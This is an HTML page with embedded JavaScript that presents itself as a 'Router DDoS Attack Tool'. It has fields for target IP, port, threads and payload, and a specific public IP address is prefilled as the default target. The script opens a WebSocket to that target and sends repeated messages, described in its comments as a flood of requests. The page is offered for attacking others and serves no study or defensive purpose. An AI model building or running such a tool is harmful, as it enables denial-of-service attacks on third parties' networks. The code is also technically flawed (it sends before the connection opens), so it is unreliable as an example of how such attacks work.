<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Router DDoS Attack Tool</title>
  <style>
    body {
      background: url('https://i.imgur.com/7QZzQyK.jpg') no-repeat center center fixed;
      -webkit-background-size: cover;
      -moz-background-size: cover;
      -o-background-size: cover;
      background-size: cover;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      color: #fff;
    }
    .container {
      background-color: rgba(0, 0, 0, 0.5);
      border-radius: 10px;
      box-shadow: 0 0 20px rgba(0,0,0,0.1);
      padding: 40px;
      width: 100%;
      max-width: 600px;
      margin: 0 auto;
    }
    h1 {
      font-size: 28px;
      margin-bottom: 20px;
      text-align: center;
    }
    form {
      display: flex;
      flex-direction: column;
      gap: 20px;
    }
    input[type=text], input[type=number], textarea {
      padding: 10px;
      border: 1px solid #ddd;
      border-radius: 5px;
      background-color: #f9f9f9;
      color: #333;
    }
    .upload-btn {
      background-color: #4CAF50;
      color: white;
      padding: 10px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      font-size: 16px;
      transition: background-color 0.3s ease;
    }
    .upload-btn:hover {
      background-color: #45a049;
    }
    .output {
      margin-top: 20px;
      padding: 20px;
      background-color: rgba(0, 0, 0, 0.5);
      border-radius: 5px;
      border: 1px solid #ddd;
      overflow-y: auto;
      max-height: 300px;
    }
    .output pre {
      white-space: pre-wrap;
      word-break: break-all;
    }
    .footer {
      margin-top: 20px;
      text-align: center;
      font-size: 14px;
      color: #999;
    }
    .flood {
      background-color: red;
      color: white;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Router DDoS Attack Tool</h1>
    <form id="ddos-form">
      <div class="form-group">
        <label for="ip">Target IP:</label>
        <input type="text" id="ip" name="ip" value="73.134.173.81" required>
      </div>
      <div class="form-group">
        <label for="port">Port:</label>
        <input type="number" id="port" name="port" value="80" required>
      </div>
      <div class="form-group">
        <label for="threads">Threads:</label>
        <input type="number" id="threads" name="threads" min="1" value="10">
      </div>
      <div class="form-group">
        <label for="payload">Payload:</label>
        <textarea id="payload" name="payload" rows="5"></textarea>
      </div>
      <button type="submit" class="upload-btn">Start Attack</button>
    </form>
    <div class="output" id="output"></div>
    <div class="footer">
      <p>Created with love by [Your Name]</p>
    </div>
  </div>

  <script>
    document.getElementById('ddos-form').addEventListener('submit', async (e) => {
      e.preventDefault();

      const ip = document.getElementById('ip').value;
      const port = document.getElementById('port').value;
      const threads = document.getElementById('threads').value;
      const payload = document.getElementById('payload').value;

      try {
        await startAttack(ip, port, threads, payload);
      } catch (error) {
        console.error(error);
        alert('Error starting attack');
      }
    });

    async function startAttack(ip, port, threads, payload) {
      const output = document.getElementById('output');
      output.innerHTML = '';

      // Create a WebSocket connection to the target router
      const socket = new WebSocket(`ws://${ip}:${port}`);

      socket.onopen = () => {
        output.innerHTML += `<p>Connected to ${ip}:${port}</p>`;
      };

      socket.onerror = (error) => {
        output.innerHTML += `<p>Error: ${error.message}</p>`;
      };

      socket.onclose = () => {
        output.innerHTML += `<p>Disconnected from ${ip}:${port}</p>`;
      };

      // Send a flood of requests with the specified payload
      for (let i = 0; i < threads; i++) {
        setTimeout(() => {
          sendRequest(socket, payload);
        }, i * 100);
      }
    }

    function sendRequest(socket, payload) {
      const data = {
        method: 'POST',
        url: '/',
        headers: {
          'User-Agent': 'Mozilla/5.0',
          'Connection': 'keep-alive',
          'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: payload
      };

      socket.send(JSON.stringify(data));
    }
  </script>
</body>
</html>
